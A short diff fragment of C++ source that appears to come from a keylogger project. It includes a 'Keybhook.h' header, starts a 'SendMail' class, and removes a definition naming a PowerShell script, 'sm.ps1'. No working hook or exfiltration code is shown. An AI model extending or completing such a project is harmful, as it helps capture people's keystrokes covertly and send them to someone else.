@@ -4,7 +4,7 @@
 #include <Windows.h>
 #include <chrono>
 #include "Keybhook.h"
-#define SCRIPT_NAME "sm.ps1"
+
 class SendMail {
 public:
     SendMail() = default;
